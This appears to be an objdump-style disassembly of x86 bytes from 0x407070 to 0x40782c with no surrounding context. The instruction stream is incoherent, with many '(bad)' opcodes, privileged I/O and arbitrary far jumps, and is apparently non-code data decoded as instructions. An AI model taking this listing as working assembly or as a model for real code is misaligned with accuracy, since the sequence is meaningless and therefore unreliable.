  407070:	movhps xmm0,QWORD PTR [ebx]
  407073:	inc    eax
  407074:	(bad)  
  407075:	ficomp DWORD PTR [esi+0x6d8da442]
  40707b:	mov    edx,0xc3265a73
  407080:	push   esp
  407081:	add    BYTE PTR [esi],dl
  407083:	sub    BYTE PTR ds:[ebx+eax*2-0x14a7b6e7],dh
  40708b:	fidiv  WORD PTR [ecx]
  40708d:	repnz push esi
  40708f:	xchg   DWORD PTR [ecx-0x42],ebx
  407092:	pop    edx
  407093:	push   es
  407094:	cmp    DWORD PTR [ecx-0x2e92d629],esi
  40709a:	xor    ebx,ebx
  40709c:	pop    esi
  40709d:	mov    dh,0x6f
  40709f:	(bad)  
  4070a0:	scas   eax,DWORD PTR es:[edi]
  4070a1:	fst    QWORD PTR [esi+esi*1-0x18802613]
  4070a8:	into   
  4070a9:	jne    0x40707d
  4070ab:	mov    ebx,0xa2e70d32
  4070b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070b1:	or     bh,al
  4070b3:	pop    ss
  4070b4:	leave  
  4070b5:	sbb    dh,BYTE PTR [ecx+0x6a]
  4070b8:	popf   
  4070b9:	jno    0x407118
  4070bb:	ret    
  4070bc:	sbb    bl,al
  4070be:	lock inc eax
  4070c0:	sub    eax,0xc7e2d697
  4070c5:	jmp    0x407099
  4070c7:	mov    bl,0x1b
  4070c9:	sub    ch,BYTE PTR [edx+0x61d3a476]
  4070cf:	jle    0x40713c
  4070d1:	mov    ecx,0x3db17c4a
  4070d6:	ins    BYTE PTR es:[edi],dx
  4070d7:	lock jg 0x407103
  4070da:	jg     0x4070c0
  4070dc:	leave  
  4070dd:	in     eax,0xba
  4070df:	mov    al,ds:0x219eae38
  4070e4:	dec    esp
  4070e5:	jp     0x40707a
  4070e7:	test   ebx,0x9c8de404
  4070ed:	loop   0x4070bc
  4070ef:	xor    edi,DWORD PTR [edx-0x20]
  4070f2:	cdq    
  4070f3:	push   ecx
  4070f4:	mov    edx,0x64752ad2
  4070f9:	leave  
  4070fa:	lds    ebx,FWORD PTR [esi]
  4070fc:	xlat   BYTE PTR ds:[ebx]
  4070fd:	loope  0x407100
  4070ff:	call   0xcb02:0x1ddb888c
  407106:	sub    ebx,esi
  407108:	inc    ebp
  407109:	cmp    dh,BYTE PTR [ecx-0x5fcbe84f]
  40710f:	test   BYTE PTR [ebx-0x1c6b5a95],0xf7
  407116:	push   eax
  407117:	add    al,0x54
  407119:	sbb    BYTE PTR [ecx-0x7b572b47],0x9e
  407120:	jne    0x407191
  407122:	sbb    dl,BYTE PTR ds:[edx]
  407125:	dec    eax
  407126:	push   eax
  407127:	aam    0x5a
  407129:	dec    ebx
  40712a:	jg     0x407103
  40712c:	fwait
  40712d:	pop    edx
  40712e:	iret   
  40712f:	lods   eax,DWORD PTR ds:[esi]
  407130:	out    dx,al
  407131:	(bad)  
  407132:	loop   0x40716b
  407134:	inc    esi
  407135:	sub    BYTE PTR ds:[esi-0x4ce031fd],ah
  40713c:	xor    DWORD PTR [eax+eiz*1],ebp
  40713f:	pop    ebp
  407140:	mov    edi,0x753b4c53
  407145:	loopne 0x407138
  407147:	pop    eax
  407148:	aad    0xf7
  40714a:	lea    ebx,[edi-0x19]
  40714d:	mov    cs,WORD PTR [edx-0x43393f53]
  407153:	enter  0xd566,0xde
  407157:	xchg   esp,eax
  407158:	fstp   TBYTE PTR [esi]
  40715a:	loopne 0x407131
  40715c:	fwait
  40715d:	push   esp
  40715e:	mov    WORD PTR [ebx+edx*8+0x517bb3c7],?
  407165:	and    DWORD PTR ds:0xfdf977e3,ebp
  40716b:	out    dx,al
  40716c:	leave  
  40716d:	add    DWORD PTR es:[eax-0x7d6db77b],0x5d
  407175:	xlat   BYTE PTR ds:[ebx]
  407176:	mov    ds:0x115ae62c,al
  40717b:	xchg   edx,eax
  40717c:	pop    ecx
  40717d:	mov    al,ds:0x89e2f01b
  407182:	sti    
  407183:	shl    DWORD PTR [ebp-0x4a],1
  407186:	push   ecx
  407187:	sbb    DWORD PTR [esi-0x5f5bfca6],eax
  40718d:	mov    ah,0x4c
  40718f:	and    DWORD PTR [edx+0x70],eax
  407192:	xchg   ebp,eax
  407193:	pop    ecx
  407194:	adc    eax,0x4f296a3
  407199:	mov    cs,WORD PTR [esi]
  40719b:	xchg   esi,eax
  40719c:	push   edx
  40719d:	jg     0x4071b5
  40719f:	add    BYTE PTR [esi-0x7ac56981],ch
  4071a5:	aam    0xd4
  4071a7:	mov    fs,edi
  4071a9:	mov    gs,eax
  4071ab:	mov    eax,0x85b7605d
  4071b0:	or     eax,0x3785a10a
  4071b5:	xchg   esi,eax
  4071b6:	xor    ch,bl
  4071b8:	pop    ds
  4071b9:	inc    edx
  4071ba:	pop    ds
  4071bb:	cs pop eax
  4071bd:	neg    ch
  4071bf:	jo     0x407231
  4071c1:	mov    DWORD PTR [ebx-0x7cc61184],eax
  4071c7:	mov    cl,0x0
  4071c9:	adc    BYTE PTR [edx+0x3c54ada6],al
  4071cf:	(bad)  
  4071d0:	fistp  DWORD PTR [edx]
  4071d2:	pop    eax
  4071d3:	mov    ch,BYTE PTR [edi-0x43a28709]
  4071d9:	push   esi
  4071da:	xor    DWORD PTR [esi-0x52ed81d7],0x66a0c9b2
  4071e4:	test   al,0x32
  4071e6:	push   edi
  4071e7:	cmp    eax,0xf451f085
  4071ec:	ret    
  4071ed:	js     0x407263
  4071ef:	mov    BYTE PTR [edi-0x3d80d8c5],ch
  4071f5:	adc    bl,al
  4071f7:	dec    edi
  4071f8:	sbb    DWORD PTR [ebp-0x3c],ecx
  4071fb:	out    0x4c,al
  4071fd:	add    ebx,DWORD PTR [esi-0x3d246736]
  407203:	scas   al,BYTE PTR es:[edi]
  407204:	xchg   esp,eax
  407205:	jecxz  0x4071d7
  407207:	add    eax,0x9ebc1e5b
  40720c:	mov    dh,0x65
  40720e:	mov    ebp,0x7929270
  407213:	mov    sp,0xe7bf
  407217:	mov    eax,0xf003ccb1
  40721c:	and    al,dh
  40721e:	mov    esp,0x47d49f51
  407223:	clc    
  407224:	inc    esi
  407225:	call   0xcc65:0xa677ea2d
  40722c:	(bad)  
  40722d:	repnz movs BYTE PTR es:[di],BYTE PTR ds:[si]
  407230:	call   0x37f8e2a9
  407235:	rcr    DWORD PTR [edx+0x7d6cae90],cl
  40723b:	imul   edi,DWORD PTR [eax+edx*4+0x51],0xb171f67f
  407243:	cmc    
  407244:	mov    esi,0x4822b5f3
  407249:	sbb    BYTE PTR [edi],bl
  40724b:	lods   al,BYTE PTR ds:[esi]
  40724c:	(bad)  
  40724e:	test   DWORD PTR [esp+ecx*2],ebx
  407251:	pop    ecx
  407252:	fwait
  407253:	iret   
  407254:	jge    0x407240
  407256:	jp     0x40728e
  407258:	pop    es
  407259:	jp     0x407237
  40725b:	jae    0x407264
  40725d:	imul   ebx,DWORD PTR [edi-0x20e659aa],0xffffff9d
  407264:	xlat   BYTE PTR ds:[ebx]
  407265:	mul    DWORD PTR [edx-0x37]
  407268:	xor    al,0x4
  40726a:	xlat   BYTE PTR ds:[ebx]
  40726b:	inc    eax
  40726c:	pop    esp
  40726d:	imul   edi,DWORD PTR ds:0xe32451f7,0xffffffc9
  407274:	sbb    dh,BYTE PTR [eax]
  407276:	lods   eax,DWORD PTR ds:[esi]
  407277:	into   
  407278:	xor    BYTE PTR [esi-0x6a],bl
  40727b:	loop   0x407207
  40727d:	xchg   BYTE PTR ds:0xf3cfb5ac,al
  407283:	jle    0x4072be
  407285:	jl     0x4072f9
  407287:	jmp    0x40722a
  407289:	stc    
  40728a:	push   ds
  40728b:	push   eax
  40728c:	dec    esp
  40728d:	or     dl,dh
  40728f:	lods   al,BYTE PTR ds:[esi]
  407290:	in     eax,dx
  407291:	cmc    
  407292:	jg     0x407271
  407294:	lods   eax,DWORD PTR ds:[esi]
  407295:	call   0x5ce9:0xc64e4a00
  40729c:	ud2    
  40729e:	xchg   ecx,eax
  40729f:	lahf   
  4072a0:	das    
  4072a1:	mov    ds:0x1cb245bd,eax
  4072a6:	fnstenv [ecx-0x2e]
  4072a9:	inc    esi
  4072aa:	icebp  
  4072ab:	cmp    esi,ebp
  4072ad:	lahf   
  4072ae:	adc    DWORD PTR [esi-0x11a03840],0x70
  4072b5:	add    ch,al
  4072b7:	sahf   
  4072b8:	sbb    DWORD PTR [esi],edx
  4072ba:	test   ebx,esi
  4072bc:	test   DWORD PTR [edx-0x5e],ebx
  4072bf:	cmp    eax,0xa24347ac
  4072c4:	cmc    
  4072c5:	xlat   BYTE PTR ds:[ebx]
  4072c6:	push   0x29
  4072c8:	js     0x407260
  4072ca:	adc    edx,eax
  4072cc:	fwait
  4072cd:	rol    DWORD PTR [eax],cl
  4072cf:	arpl   WORD PTR [edx+0x5eb86029],bp
  4072d5:	add    al,0xfd
  4072d7:	mov    eax,0xcfc2de55
  4072dc:	xor    DWORD PTR [ebp+0x2bd15fea],ebx
  4072e2:	ret    
  4072e3:	jbe    0x407362
  4072e5:	mov    edi,0x34d9b72a
  4072ea:	mov    bh,BYTE PTR [esi+0x47b9287f]
  4072f0:	nop
  4072f1:	mov    ebx,esp
  4072f3:	or     cl,dl
  4072f5:	aaa    
  4072f6:	xor    cl,BYTE PTR [ebx-0x620f60c9]
  4072fc:	gs cmp al,0x28
  4072ff:	pop    esi
  407300:	retf   0xf11d
  407303:	dec    eax
  407304:	dec    ecx
  407305:	xor    DWORD PTR [ecx+0x77],edi
  407308:	lods   eax,DWORD PTR ds:[esi]
  407309:	data16 and BYTE PTR [edi-0x27],bh
  40730d:	enter  0x29fc,0xfa
  407311:	in     eax,dx
  407312:	enter  0xe9f9,0x1c
  407316:	icebp  
  407317:	mov    ds:0x75a4e7d0,eax
  40731c:	dec    edx
  40731d:	xchg   BYTE PTR [edx+0x2a],cl
  407320:	xchg   edx,eax
  407321:	pop    ebp
  407322:	scas   al,BYTE PTR es:[edi]
  407323:	out    dx,al
  407324:	xlat   BYTE PTR ds:[ebx]
  407325:	pushf  
  407326:	lods   eax,DWORD PTR ds:[esi]
  407327:	fldenv [eax+0x1a]
  40732a:	sbb    eax,0x974f74b8
  40732f:	sbb    BYTE PTR [ebx-0x732f9f8d],ch
  407335:	inc    eax
  407336:	sti    
  407337:	mov    ch,0xd7
  407339:	int    0x54
  40733b:	jnp    0x40731b
  40733d:	jp     0x407392
  40733f:	sbb    bl,BYTE PTR [ebx+0x63bc8e8b]
  407345:	call   0xf715:0x1f23782a
  40734c:	mov    ebx,DWORD PTR [esi+0x32]
  40734f:	mov    edx,0x26d61ac3
  407354:	mov    BYTE PTR [ebx],dl
  407356:	inc    esp
  407357:	adc    ecx,DWORD PTR [edx+0x2f]
  40735a:	xchg   DWORD PTR [ebp+0x7b153548],edx
  407360:	jl     0x4073c1
  407362:	lock outs dx,DWORD PTR ds:[esi]
  407364:	push   ebx
  407365:	int    0x54
  407367:	xchg   ebp,eax
  407368:	sahf   
  407369:	fmul   QWORD PTR [edx-0x57]
  40736c:	push   edi
  40736d:	int3   
  40736e:	add    BYTE PTR [ebp+0x59],bl
  407371:	inc    edx
  407372:	icebp  
  407373:	add    edi,DWORD PTR [esi]
  407375:	add    al,0x3
  407377:	push   ecx
  407378:	loope  0x4073ce
  40737a:	(bad)  [ecx+ecx*2]
  40737d:	mov    ebx,DWORD PTR ds:0xd1224f48
  407383:	out    dx,eax
  407384:	sbb    ebx,edx
  407386:	xchg   edx,eax
  407387:	fcomp  st(0)
  407389:	nop
  40738a:	out    0x93,eax
  40738c:	or     bl,BYTE PTR [edx+eax*2]
  40738f:	int    0x5c
  407391:	and    BYTE PTR [edx-0x69],al
  407394:	retf   0xf9ac
  407397:	lds    edi,FWORD PTR [esi-0x7ac50341]
  40739d:	adc    DWORD PTR [edx-0x372fb14e],0x4bd8d412
  4073a7:	push   ebp
  4073a8:	adc    eax,0x59f73651
  4073ad:	mov    ah,0xbc
  4073af:	mov    al,0x8e
  4073b1:	sub    DWORD PTR [edx+0x50],esp
  4073b4:	stc    
  4073b5:	loop   0x407363
  4073b7:	cmp    al,0xbc
  4073b9:	xchg   ecx,eax
  4073ba:	arpl   WORD PTR [ebx],si
  4073bc:	add    ebp,edx
  4073be:	lods   al,BYTE PTR ds:[esi]
  4073bf:	loopne 0x40740e
  4073c1:	xchg   esi,eax
  4073c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073c3:	jno    0x4073fe
  4073c5:	popa   
  4073c6:	cli    
  4073c7:	sub    al,0xf9
  4073c9:	into   
  4073ca:	push   0x7
  4073cc:	loop   0x4073cb
  4073ce:	pop    ebp
  4073cf:	and    eax,0x3a8817e8
  4073d4:	out    dx,eax
  4073d5:	jmp    0xf669:0x151e0ce2
  4073dc:	mov    eax,ds:0xd7bb75ac
  4073e1:	lea    ecx,[edi+0x8]
  4073e4:	and    eax,0x5237f5e5
  4073e9:	add    edx,ebx
  4073eb:	in     eax,0x73
  4073ed:	push   ebp
  4073ee:	fcom   DWORD PTR [edx]
  4073f0:	mov    al,0xc6
  4073f2:	push   ds
  4073f3:	mov    ebx,DWORD PTR [esi+edx*8-0x580164c7]
  4073fa:	aas    
  4073fb:	xchg   edi,eax
  4073fc:	pop    edx
  4073fd:	sub    edx,DWORD PTR [esi+0xd]
  407400:	mov    dl,0xc3
  407402:	cdq    
  407403:	lods   eax,DWORD PTR ds:[esi]
  407404:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407405:	loope  0x40742e
  407407:	outs   dx,BYTE PTR ds:[esi]
  407408:	xchg   esi,eax
  407409:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40740a:	pop    eax
  40740b:	in     al,dx
  40740c:	sub    al,0x2
  40740e:	test   BYTE PTR [esi-0x5],dl
  407411:	outs   dx,BYTE PTR ds:[esi]
  407412:	pop    ecx
  407413:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407414:	xor    al,0x56
  407416:	mov    BYTE PTR [eax-0x7a],al
  407419:	push   ds
  40741a:	mov    edx,0x17d44621
  40741f:	jmp    0x4640e1c8
  407424:	lds    edi,FWORD PTR [esi+0x52e6f4bd]
  40742a:	outs   dx,BYTE PTR ds:[esi]
  40742b:	shr    dh,cl
  40742d:	adc    bh,BYTE PTR [ebx+0x20]
  407430:	dec    edx
  407431:	ja     0x40743e
  407433:	in     eax,0x83
  407435:	mov    al,0x38
  407437:	cmp    edx,DWORD PTR [ebp-0x6f]
  40743a:	sbb    BYTE PTR [esi-0x2c],bl
  40743d:	cmp    DWORD PTR [ebp-0x30b957ac],ebp
  407443:	cs (bad) 
  407446:	jp     0x4074c4
  407448:	jge    0x4074a0
  40744a:	dec    ebx
  40744b:	mov    dh,0xc1
  40744d:	cmp    al,0xc
  40744f:	ret    
  407450:	inc    edx
  407451:	xor    al,0xa5
  407453:	pop    ebp
  407454:	jg     0x40742a
  407456:	adc    edi,edx
  407458:	mov    bh,BYTE PTR [esi+edi*8]
  40745b:	adc    ebp,DWORD PTR [ecx+0x14]
  40745e:	adc    dl,BYTE PTR [ecx]
  407460:	lods   eax,DWORD PTR ds:[esi]
  407461:	sar    ebx,1
  407463:	xchg   BYTE PTR [esi],cl
  407465:	jg     0x407450
  407467:	test   DWORD PTR [ebx+ecx*4+0x66],edi
  40746b:	int    0x86
  40746d:	or     bl,bl
  40746f:	push   ebp
  407470:	daa    
  407471:	pushf  
  407472:	xor    DWORD PTR [esi],ebx
  407474:	add    eax,0x95486bb9
  407479:	dec    ecx
  40747a:	clc    
  40747b:	bound  ebp,QWORD PTR [ecx+0x2e2df5e]
  407481:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407482:	jae    0x40749f
  407484:	in     al,0x4d
  407486:	jo     0x4074f0
  407488:	fist   WORD PTR [edi-0x41]
  40748b:	jl     0x4074f1
  40748d:	jo     0x40745b
  40748f:	in     al,0x72
  407491:	push   0xffffffe4
  407493:	add    esp,DWORD PTR [eax+eiz*1]
  407496:	mov    ds:0xbf0312d5,eax
  40749b:	mov    al,ds:0xaa3c86d8
  4074a0:	mov    ds:0xc63db5c9,al
  4074a5:	add    eax,0x6447913c
  4074aa:	jbe    0x4074c3
  4074ac:	and    DWORD PTR ds:0xf5120920,0x44cbf19d
  4074b6:	aaa    
  4074b7:	sbb    DWORD PTR [ebx],0x5b
  4074ba:	dec    edx
  4074bb:	ret    
  4074bc:	cdq    
  4074bd:	shr    bl,1
  4074bf:	jge    0x407526
  4074c1:	dec    esp
  4074c2:	ins    DWORD PTR es:[edi],dx
  4074c3:	div    BYTE PTR [eax]
  4074c5:	test   BYTE PTR [eax+ecx*8-0x2d748b0c],ch
  4074cc:	jb     0x407529
  4074ce:	icebp  
  4074cf:	dec    ebp
  4074d0:	das    
  4074d1:	out    0xbb,eax
  4074d3:	into   
  4074d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074d5:	jmp    0x844174db
  4074da:	jno    0x4074b8
  4074dc:	popf   
  4074dd:	les    esi,FWORD PTR [ebx]
  4074df:	sub    ah,dl
  4074e1:	xchg   ebp,eax
  4074e2:	inc    edi
  4074e3:	dec    edi
  4074e4:	sub    esp,ebx
  4074e6:	loop   0x407496
  4074e8:	aad    0x58
  4074ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074eb:	in     eax,dx
  4074ec:	pop    edi
  4074ed:	push   ebp
  4074ee:	cmp    eax,0x2ffa5d08
  4074f3:	shl    DWORD PTR [edi],1
  4074f5:	fadd   DWORD PTR [edx+edi*4]
  4074f8:	sahf   
  4074f9:	mov    esp,0x9bc9464
  4074fe:	pop    ebx
  4074ff:	and    cl,BYTE PTR [esi]
  407501:	mov    esp,0x68a1252f
  407506:	push   ebp
  407507:	add    BYTE PTR [esi+eiz*1-0x239ad5d7],bl
  40750e:	mov    cl,0xaa
  407510:	js     0x4074f2
  407512:	mov    esp,0x86dc4018
  407517:	xchg   DWORD PTR [ebp-0x32],edi
  40751a:	popa   
  40751b:	adc    BYTE PTR [edx],0xd1
  40751e:	retf   0x5d50
  407521:	inc    esp
  407522:	repz loope 0x407531
  407525:	mov    al,0x11
  407527:	xchg   esp,eax
  407528:	jl     0x40754f
  40752a:	sbb    eax,0x17d4cc32
  40752f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407530:	daa    
  407531:	xchg   DWORD PTR [ebx+0x3114fb43],eax
  407537:	dec    ebx
  407538:	cmp    DWORD PTR [edi+0x73],esi
  40753b:	shl    BYTE PTR [edi+ecx*8],1
  40753e:	adc    al,0x47
  407540:	push   0xffffffab
  407542:	mov    eax,0xbefa38e7
  407547:	jg     0x4075b1
  407549:	push   0xe
  40754b:	xchg   ebp,eax
  40754c:	xchg   DWORD PTR [esi],esp
  40754e:	outs   dx,BYTE PTR ds:[esi]
  40754f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407550:	(bad)  
  407551:	push   edx
  407552:	xor    DWORD PTR [ecx-0x17],0x2b9641c4
  407559:	psllw  mm7,mm2
  40755c:	jno    0x407575
  40755e:	int    0x18
  407560:	xor    BYTE PTR fs:[ecx],bh
  407563:	leave  
  407564:	stos   DWORD PTR es:[edi],eax
  407565:	ret    
  407566:	pusha  
  407567:	inc    esi
  407568:	xchg   ebp,eax
  407569:	push   ss
  40756a:	inc    edx
  40756b:	loop   0x4075d1
  40756d:	es mov DWORD PTR ss:[edi-0x3b],edi
  407572:	dec    esp
  407573:	inc    ecx
  407574:	mov    ebx,0xab60b34e
  407579:	ret    
  40757a:	jbe    0x40755c
  40757c:	scas   al,BYTE PTR es:[edi]
  40757d:	cwde   
  40757e:	lods   al,BYTE PTR ds:[esi]
  40757f:	xchg   DWORD PTR [eax+ebx*4+0x58fa75fe],ebx
  407586:	aam    0xc
  407588:	mov    ecx,0xe4f3c9fc
  40758d:	cmp    esi,DWORD PTR [ebx]
  40758f:	mov    edi,0x5de7c83e
  407594:	test   al,0x67
  407596:	add    ebx,DWORD PTR [esi+0x12]
  407599:	or     BYTE PTR [eax+0xe28dbcf],bl
  40759f:	pop    ecx
  4075a0:	xchg   ebp,eax
  4075a1:	sbb    DWORD PTR ds:0x3954d737,edx
  4075a7:	stc    
  4075a8:	jne    0x4075f4
  4075aa:	adc    edx,edx
  4075ac:	jmp    0x1b439676
  4075b1:	popf   
  4075b2:	jge    0x407538
  4075b4:	xchg   esi,eax
  4075b5:	pop    ecx
  4075b6:	sbb    dh,ah
  4075b8:	and    ebx,esp
  4075ba:	fwait
  4075bb:	or     al,0xfb
  4075bd:	xor    BYTE PTR [edx+0x56],0x93
  4075c1:	leave  
  4075c2:	in     al,dx
  4075c3:	sub    DWORD PTR ds:0x7724b83b,ecx
  4075c9:	call   0xbf29:0x87b4827e
  4075d0:	inc    edi
  4075d1:	scas   al,BYTE PTR es:[edi]
  4075d2:	pop    gs
  4075d4:	pop    ds
  4075d5:	jno    0x4075f6
  4075d7:	mov    dl,0x16
  4075d9:	cwde   
  4075da:	ins    DWORD PTR es:[edi],dx
  4075db:	push   cs
  4075dc:	fcmovnu st,st(3)
  4075de:	jge    0x407581
  4075e0:	cs dec esi
  4075e2:	sub    al,0xf2
  4075e4:	call   0xeff5:0x1a819092
  4075eb:	inc    ebp
  4075ec:	mov    cl,0x81
  4075ee:	loopne 0x407662
  4075f0:	(bad)  
  4075f1:	jnp    0x4075bc
  4075f3:	int    0x5e
  4075f5:	mov    ds:0x14a57c5e,eax
  4075fa:	sbb    DWORD PTR [esi+0x7efc4e03],edx
  407600:	pop    edi
  407601:	cld    
  407602:	adc    eax,0x2ab77da2
  407607:	mov    al,0x5d
  407609:	sub    bh,dh
  40760b:	cmp    al,0x35
  40760d:	and    ebx,esp
  40760f:	idiv   BYTE PTR [edi]
  407611:	ins    BYTE PTR es:[edi],dx
  407612:	mov    bh,0x10
  407614:	out    dx,eax
  407615:	inc    DWORD PTR [ebx+0x7828c7be]
  40761b:	jbe    0x407619
  40761d:	push   ecx
  40761e:	xor    eax,0x8cd4ca07
  407623:	sbb    eax,0xddbbdb56
  407628:	mov    ebx,0x29f8bd3c
  40762d:	loop   0x407650
  40762f:	in     eax,0xfb
  407631:	pop    ebp
  407632:	lods   eax,DWORD PTR ds:[esi]
  407633:	inc    edx
  407634:	or     DWORD PTR [edx-0x42f5e6bb],esi
  40763a:	mov    BYTE PTR [edx-0x5d],bh
  40763d:	mov    edx,0x30c5706f
  407642:	inc    edi
  407643:	mov    al,ds:0x9f8f60d9
  407648:	or     al,0x81
  40764a:	pop    esi
  40764b:	test   al,0x8d
  40764d:	inc    esi
  40764e:	das    
  40764f:	xchg   edx,eax
  407650:	daa    
  407651:	mov    ah,0xb
  407653:	scas   al,BYTE PTR es:[edi]
  407654:	xchg   bl,al
  407656:	inc    eax
  407657:	mov    eax,0x54a17147
  40765c:	popa   
  40765d:	psubw  mm2,QWORD PTR [ecx-0x18]
  407661:	adc    eax,0x25a68cf0
  407666:	fild   WORD PTR [edx]
  407668:	aas    
  407669:	(bad)  
  40766a:	cs mov ah,0x43
  40766d:	or     al,bh
  40766f:	pop    ds
  407670:	shr    dh,cl
  407672:	mov    ebp,0x48fbfd22
  407677:	push   ecx
  407678:	sbb    ebp,ecx
  40767a:	retf   
  40767b:	rcl    BYTE PTR [ebx+0x3cda45b4],0x4b
  407682:	xor    BYTE PTR [esi-0x19],0xcc
  407686:	jmp    0xbbf5ae50
  40768b:	adc    ch,BYTE PTR ds:0x385aeb35
  407691:	into   
  407692:	and    eax,0xdb2bb17a
  407697:	sbb    eax,0x39134855
  40769c:	je     0x40763d
  40769e:	mov    ebx,0xb8082b4e
  4076a3:	aaa    
  4076a4:	fldenv [edi]
  4076a6:	repz aam 0xff
  4076a9:	inc    ebx
  4076aa:	jnp    0x4076a1
  4076ac:	stos   BYTE PTR es:[edi],al
  4076ad:	outs   dx,DWORD PTR ds:[esi]
  4076ae:	push   ds
  4076af:	rdpmc  
  4076b1:	(bad)  
  4076b2:	xchg   edi,eax
  4076b3:	push   cs
  4076b4:	inc    ebx
  4076b5:	lods   al,BYTE PTR ds:[esi]
  4076b6:	and    al,0x7e
  4076b8:	cmp    esi,DWORD PTR [ebp-0xacc076e]
  4076be:	cli    
  4076bf:	(bad)  
  4076c0:	out    dx,eax
  4076c1:	pushf  
  4076c2:	mov    ds,edi
  4076c4:	push   es
  4076c5:	xchg   edi,eax
  4076c6:	mov    cl,0x2b
  4076c9:	loopne 0x4076cb
  4076cb:	xor    ch,BYTE PTR ds:0xaf984fc
  4076d1:	mov    ch,0xdb
  4076d3:	mov    esp,0xf5ef4a2a
  4076d8:	fistp  QWORD PTR ds:0xc2729044
  4076de:	add    esp,0xffffffe5
  4076e1:	mov    ds:0x2a5179a9,al
  4076e6:	xchg   ebx,eax
  4076e7:	lods   al,BYTE PTR ds:[esi]
  4076e8:	js     0x407765
  4076ea:	stc    
  4076eb:	out    0xd3,al
  4076ed:	cmp    ch,dh
  4076ef:	(bad)  
  4076f0:	xlat   BYTE PTR ds:[ebx]
  4076f1:	mov    dl,0x5d
  4076f3:	cmc    
  4076f4:	call   0x1b69:0xc6092150
  4076fb:	push   esp
  4076fc:	add    edx,DWORD PTR [ebp-0x4ca00fbd]
  407702:	sbb    ch,al
  407704:	lahf   
  407705:	leave  
  407706:	fadd   QWORD PTR [ebx+edi*8]
  407709:	jmp    0xaf4:0xe09fdee4
  407710:	rol    DWORD PTR [esi+0x5f316a0],1
  407716:	ss (bad) 
  407718:	lds    edx,FWORD PTR [ebp+esi*1+0x5d]
  40771c:	xchg   edx,eax
  40771d:	mov    dh,0xb5
  40771f:	aas    
  407720:	or     al,0xaf
  407722:	sahf   
  407723:	es sahf 
  407725:	jmp    0x4076d0
  407727:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407728:	js     0x4076b8
  40772a:	inc    eax
  40772b:	adc    eax,0xce585ed7
  407730:	add    BYTE PTR [esi],0xa2
  407733:	pushf  
  407734:	shr    edi,0x70
  407737:	repnz push ecx
  407739:	sub    ah,ch
  40773b:	(bad)  
  40773c:	scas   eax,DWORD PTR es:[edi]
  40773d:	jp     0x407796
  40773f:	pop    esp
  407740:	pushf  
  407741:	jo     0x40778e
  407743:	ja     0x40771c
  407745:	mov    WORD PTR [ebp+0x48],gs
  407748:	mov    cs,WORD PTR [ecx-0x56b07522]
  40774e:	data16 jp 0x407727
  407751:	cwde   
  407752:	jae    0x40777c
  407754:	loop   0x4077ad
  407756:	jge    0x4076fc
  407758:	xor    al,0xfd
  40775a:	imul   BYTE PTR [esi+0x55de5e03]
  407760:	nop
  407761:	loop   0x407793
  407763:	outs   dx,DWORD PTR ds:[esi]
  407764:	inc    ebp
  407765:	daa    
  407766:	dec    esp
  407767:	(bad)  [ebp+ebx*4+0x41a469b]
  40776e:	popf   
  40776f:	pusha  
  407770:	cmp    bl,ch
  407772:	mov    edi,0x28d935c1
  407777:	rcl    BYTE PTR [ebp+0x40142627],cl
  40777d:	cmp    eax,0xbc042c7a
  407782:	call   0x7fabb866
  407787:	sub    al,0xbc
  407789:	fist   WORD PTR [edx+0x7]
  40778c:	dec    esp
  40778d:	dec    ebx
  40778e:	xchg   DWORD PTR [ebp+0x39e855a4],ebp
  407794:	loope  0x407805
  407796:	mov    ds:0xd6b50967,eax
  40779b:	test   DWORD PTR [esi],eax
  40779d:	std    
  40779e:	sbb    eax,0x4b3de6dc
  4077a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077a4:	mov    edi,edi
  4077a6:	mov    BYTE PTR [ebp-0x2f],ah
  4077a9:	dec    edi
  4077aa:	mov    eax,ds:0xb1e6a8c6
  4077af:	push   edx
  4077b0:	scas   al,BYTE PTR es:[edi]
  4077b1:	in     al,dx
  4077b2:	pop    ebx
  4077b3:	mov    edx,0xe7ac4cf
  4077b8:	pop    edi
  4077b9:	cmp    sp,WORD PTR [ebx+0x73f7d0cf]
  4077c0:	xchg   edi,eax
  4077c1:	lahf   
  4077c2:	xchg   ebx,eax
  4077c3:	sub    BYTE PTR [ebp+0x66b91026],ch
  4077c9:	mov    ebp,DWORD PTR [ebp+0x2c]
  4077cc:	mov    eax,ds:0x3e83aaed
  4077d1:	inc    DWORD PTR [ecx-0x5]
  4077d4:	push   ecx
  4077d5:	adc    DWORD PTR [edi],eax
  4077d7:	scas   eax,DWORD PTR es:[edi]
  4077d8:	inc    edx
  4077d9:	jge    0x4077fb
  4077db:	fwait
  4077dc:	jecxz  0x4077f2
  4077de:	mov    ds:0xca12e60d,eax
  4077e3:	sbb    eax,0x6c134b21
  4077e8:	mov    dh,0xe9
  4077ea:	stos   BYTE PTR es:[edi],al
  4077eb:	dec    edi
  4077ec:	ja     0x407812
  4077ee:	fucom  st(3)
  4077f0:	ss mov ebp,esp
  4077f3:	xor    al,0x5a
  4077f5:	sub    dl,bl
  4077f7:	xchg   edi,eax
  4077f8:	fldenv [ecx-0x7c]
  4077fb:	inc    edi
  4077fc:	or     DWORD PTR [esp+eiz*2],edx
  4077ff:	and    ch,ah
  407801:	lock xlat BYTE PTR ds:[ebx]
  407803:	sub    BYTE PTR [esi-0x34],al
  407806:	out    dx,al
  407807:	mov    al,0xe
  407809:	dec    esp
  40780a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40780b:	fidivr WORD PTR [ebx]
  40780d:	pusha  
  40780e:	add    esp,ecx
  407810:	adc    eax,0x58d1959
  407815:	sbb    BYTE PTR ds:0x615b0a43,al
  40781b:	cld    
  40781c:	fidiv  WORD PTR [eax-0x1]
  40781f:	sub    eax,0x944842f2
  407824:	pusha  
  407825:	je     0x40781d
  407827:	mov    ds:0x6a9791ea,eax
  40782c:	pop    ebx
